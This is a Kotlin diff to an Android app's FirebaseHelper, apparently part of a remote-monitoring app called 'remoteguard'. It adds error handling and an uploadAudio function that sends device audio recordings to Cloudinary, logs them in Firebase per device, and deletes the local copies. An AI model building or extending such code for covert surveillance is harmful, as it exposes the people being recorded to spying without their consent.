@@ -37,14 +37,19 @@ object FirebaseHelper {
 
     fun getDeviceId(context: Context): String {
         if (deviceId == null) {
-            val sharedPrefs = context.getSharedPreferences("remoteguard_prefs", Context.MODE_PRIVATE)
-            deviceId = sharedPrefs.getString("device_id", null)
-            if (deviceId == null) {
+            try {
+                val sharedPrefs = context.getSharedPreferences("remoteguard_prefs", Context.MODE_PRIVATE)
+                deviceId = sharedPrefs.getString("device_id", null)
+                if (deviceId == null) {
+                    deviceId = UUID.randomUUID().toString().substring(0, 8).uppercase()
+                    sharedPrefs.edit().putString("device_id", deviceId).apply()
+                }
+            } catch (e: Exception) {
+                Log.e("FirebaseHelper", "Error getting device ID: ${e.message}", e)
                 deviceId = UUID.randomUUID().toString().substring(0, 8).uppercase()
-                sharedPrefs.edit().putString("device_id", deviceId).apply()
             }
         }
-        return deviceId!!
+        return deviceId ?: "UNKNOWN"
     }
 
     private fun logRemote(tag: String, message: String, isError: Boolean = false) {
@@ -60,28 +65,47 @@ object FirebaseHelper {
     }
 
     fun initialize(context: Context) {
-        getDeviceId(context)
-        logRemote("FirebaseHelper", "Initializing Firebase and Cloudinary...")
-        database.goOnline()
-        observeRealtimeConnection(context)
-        getCommandsRef(context).keepSynced(true)
+        try {
+            getDeviceId(context)
+            logRemote("FirebaseHelper", "Initializing Firebase and Cloudinary...")
 
-        // Initialize Cloudinary
-        ensureCloudinaryReady(context)
+            try {
+                database.goOnline()
+            } catch (e: Exception) {
+                Log.e("FirebaseHelper", "Error going online: ${e.message}")
+            }
 
-        if (auth.currentUser == null) {
-            logRemote("FirebaseHelper", "Starting Anonymous Auth...")
-            auth.signInAnonymously()
-                .addOnSuccessListener {
-                    logRemote("FirebaseHelper", "Firebase Anonymous sign-in SUCCESS: ${it.user?.uid}")
-                    updateDeviceInfo(context)
-                }
-                .addOnFailureListener {
-                    logRemote("FirebaseHelper", "Firebase Anonymous sign-in FAILED: ${it.message}", true)
-                }
-        } else {
-            logRemote("FirebaseHelper", "Firebase already signed in")
-            updateDeviceInfo(context)
+            try {
+                observeRealtimeConnection(context)
+            } catch (e: Exception) {
+                Log.e("FirebaseHelper", "Error observing connection: ${e.message}")
+            }
+
+            try {
+                getCommandsRef(context).keepSynced(true)
+            } catch (e: Exception) {
+                Log.e("FirebaseHelper", "Error keeping commands synced: ${e.message}")
+            }
+
+            // Initialize Cloudinary
+            ensureCloudinaryReady(context)
+
+            if (auth.currentUser == null) {
+                logRemote("FirebaseHelper", "Starting Anonymous Auth...")
+                auth.signInAnonymously()
+                    .addOnSuccessListener {
+                        logRemote("FirebaseHelper", "Firebase Anonymous sign-in SUCCESS: ${it.user?.uid}")
+                        updateDeviceInfo(context)
+                    }
+                    .addOnFailureListener {
+                        logRemote("FirebaseHelper", "Firebase Anonymous sign-in FAILED: ${it.message}", true)
+                    }
+            } else {
+                logRemote("FirebaseHelper", "Firebase already signed in")
+                updateDeviceInfo(context)
+            }
+        } catch (e: Exception) {
+            Log.e("FirebaseHelper", "Fatal error during initialization: ${e.message}", e)
         }
     }
 
@@ -308,6 +332,51 @@ object FirebaseHelper {
                 }).dispatch()
         } catch (e: Exception) {
             logRemote("FirebaseHelper", "VIDEO: Fatal Exception: ${e.message}", true)
+        }
+    }
+
+    fun uploadAudio(context: Context, audioFile: java.io.File) {
+        if (!ensureCloudinaryReady(context)) return
+        val id = getDeviceId(context)
+        val fileName = audioFile.name
+        logRemote("FirebaseHelper", "ATTEMPTING AUDIO UPLOAD: $fileName")
+
+        if (!audioFile.exists()) {
+            logRemote("FirebaseHelper", "AUDIO ERROR: File does not exist at ${audioFile.absolutePath}", true)
+            return
+        }
+
+        try {
+            MediaManager.get().upload(audioFile.absolutePath)
+                .unsigned(CLOUDINARY_UPLOAD_PRESET)
+                .option("resource_type", "video")
+                .option("folder", "audios/$id")
+                .callback(object : UploadCallback {
+                    override fun onStart(requestId: String) {
+                        logRemote("FirebaseHelper", "AUDIO: onStart - $requestId")
+                    }
+                    override fun onProgress(requestId: String, bytes: Long, totalBytes: Long) {}
+                    override fun onSuccess(requestId: String, resultData: Map<*, *>) {
+                        val url = resultData["secure_url"] as String
+                        logRemote("FirebaseHelper", "AUDIO: onSuccess - URL: $url")
+                        database.getReference("devices/$id/audios").push().setValue(
+                            mapOf(
+                                "name" to fileName,
+                                "url" to url,
+                                "timestamp" to System.currentTimeMillis()
+                            )
+                        ).addOnSuccessListener { audioFile.delete() }
+                    }
+                    override fun onError(requestId: String, error: ErrorInfo) {
+                        logRemote("FirebaseHelper", "AUDIO: onError - ${error.description} (Code: ${error.code})", true)
+                        audioFile.delete()
+                    }
+                    override fun onReschedule(requestId: String, error: ErrorInfo) {
+                        logRemote("FirebaseHelper", "AUDIO: onReschedule - ${error.description} (Code: ${error.code})", true)
+                    }
+                }).dispatch()
+        } catch (e: Exception) {
+            logRemote("FirebaseHelper", "AUDIO: Fatal Exception: ${e.message}", true)
         }
     }
 
